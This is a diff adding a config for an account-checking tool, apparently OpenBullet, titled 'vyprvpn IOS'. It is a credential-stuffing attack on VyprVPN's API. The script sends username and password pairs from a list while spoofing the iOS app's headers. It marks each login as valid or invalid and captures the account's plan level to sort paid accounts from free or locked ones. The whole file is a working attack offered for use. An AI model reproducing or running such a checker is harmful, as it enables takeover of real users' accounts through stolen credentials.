@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "vyprvpn IOS",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-05T23:00:38.0532227+02:00",
+  "AdditionalInfo": "",
+  "Author": "Desme#5333",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "X-GF-PLATFORM-VERSION: 12.0.1" 
+  HEADER "X-API-Features: partial_sign_up;" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "Accept: */*" 
+  HEADER "X-GF-PLATFORM: iOS" 
+  HEADER "locale: de_DE" 
+  HEADER "X-GF-DEVICE-NAME: iPhone" 
+  HEADER "password: <PASS>" 
+  HEADER "X-API-Version: 2" 
+  HEADER "username: <USER>" 
+  HEADER "User-Agent: VyprVPN/7327 CFNetwork/974.2.1 Darwin/18.0.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-GF-PRODUCT-VERSION: 3.0.0.7327" 
+  HEADER "X-GF-Agent: VyprVPN iOS 3.0.0.7327 (21a2ef40)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "confirmed\": true" 
+
+PARSE "<SOURCE>" JSON "account_level_display" -> CAP "Plan" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "VyprVPN Free" 
+    KEY "<Plan>" DoesNotContain "Vypr" 
+    KEY "locked" 
+
